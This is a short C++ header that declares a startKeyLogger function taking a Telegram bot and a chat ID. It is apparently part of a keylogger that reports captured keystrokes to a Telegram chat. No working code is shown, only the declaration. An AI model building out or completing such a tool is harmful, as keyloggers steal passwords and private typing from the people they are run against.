#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <iostream>
#include <tgbot/tgbot.h>
#include "globals.h"

void startKeyLogger(const TgBot::Bot& bot_ref, const int64_t chat_id);

#endif